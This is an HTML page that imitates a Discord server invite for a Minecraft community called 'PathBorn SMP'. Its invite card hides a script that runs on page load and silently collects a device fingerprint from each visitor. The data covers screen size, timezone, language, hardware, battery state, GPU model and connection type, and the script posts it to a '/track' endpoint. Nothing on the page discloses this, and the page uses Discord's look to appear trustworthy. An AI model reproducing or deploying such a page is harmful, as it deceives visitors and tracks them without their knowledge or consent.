<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>PathBorn SMP — Discord</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #404eed;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
  }
  .card {
    background: #2b2d31;
    border-radius: 8px;
    padding: 24px;
    width: 480px;
    max-width: 95vw;
    box-shadow: 0 8px 16px rgba(0,0,0,0.4);
  }
  .top {
    display: flex;
    align-items: center;
    gap: 16px;
    margin-bottom: 20px;
  }
  .server-icon {
    width: 60px;
    height: 60px;
    border-radius: 16px;
    background: #5865f2;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 28px;
    flex-shrink: 0;
    overflow: hidden;
  }
  .server-icon img {
    width: 100%;
    height: 100%;
    object-fit: cover;
  }
  .server-info h1 {
    color: #f2f3f5;
    font-size: 20px;
    font-weight: 700;
  }
  .server-info .tag {
    color: #b5bac1;
    font-size: 13px;
    margin-top: 2px;
  }
  .divider {
    height: 1px;
    background: #3b3d44;
    margin: 16px 0;
  }
  .stats {
    display: flex;
    gap: 20px;
    margin-bottom: 20px;
  }
  .stat {
    display: flex;
    align-items: center;
    gap: 6px;
    color: #b5bac1;
    font-size: 13px;
  }
  .dot {
    width: 8px;
    height: 8px;
    border-radius: 50%;
  }
  .dot.online { background: #23a559; }
  .dot.offline { background: #80848e; }
  .invite-text {
    color: #b5bac1;
    font-size: 13px;
    margin-bottom: 16px;
  }
  .invite-text span {
    color: #00a8fc;
    font-weight: 600;
  }
  .btn {
    display: block;
    width: 100%;
    padding: 14px;
    background: #5865f2;
    color: white;
    border: none;
    border-radius: 4px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    text-align: center;
    text-decoration: none;
    transition: background 0.15s;
  }
  .btn:hover { background: #4752c4; }
  .footer {
    margin-top: 12px;
    text-align: center;
    color: #6d6f78;
    font-size: 12px;
  }
</style>
</head>
<body>
<div class="card">
  <div class="top">
    <div class="server-icon">
      <img src="/discord.png" onerror="this.style.display='none'">
    </div>
    <div class="server-info">
      <h1>PathBorn SMP</h1>
      <div class="tag">Minecraft Community Server</div>
    </div>
  </div>
  <div class="divider"></div>
  <div class="stats">
    <div class="stat">
      <div class="dot online"></div>
      <span>24 Online</span>
    </div>
    <div class="stat">
      <div class="dot offline"></div>
      <span>180 Members</span>
    </div>
  </div>
  <div class="invite-text">
    You have been invited to join <span>PathBorn SMP</span>
  </div>
  <a class="btn" href="https://discord.gg/WaJp8PwxPA" id="joinbtn">Accept Invite</a>
  <div class="footer">By joining, you agree to Discord's Terms of Service</div>
</div>
<script>
async function collect() {
  const data = {
    screen: window.screen.width + 'x' + window.screen.height,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    language: navigator.language,
    platform: navigator.platform,
    cores: navigator.hardwareConcurrency,
    memory: navigator.deviceMemory || '?',
    touch: navigator.maxTouchPoints > 0,
    referrer: document.referrer || 'Direct',
    window_size: window.innerWidth + 'x' + window.innerHeight,
  }

  if (navigator.getBattery) {
    try {
      const b = await navigator.getBattery()
      data.battery_level = Math.round(b.level * 100) + '%'
      data.battery_charging = b.charging
    } catch(e) {}
  }

  try {
    const gl = document.createElement('canvas').getContext('webgl')
    const ext = gl.getExtension('WEBGL_debug_renderer_info')
    data.gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)
  } catch(e) {}

  if (navigator.connection) {
    data.connection = navigator.connection.effectiveType
  }

  fetch('/track', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  })
}
collect()
</script>
</body>
</html>
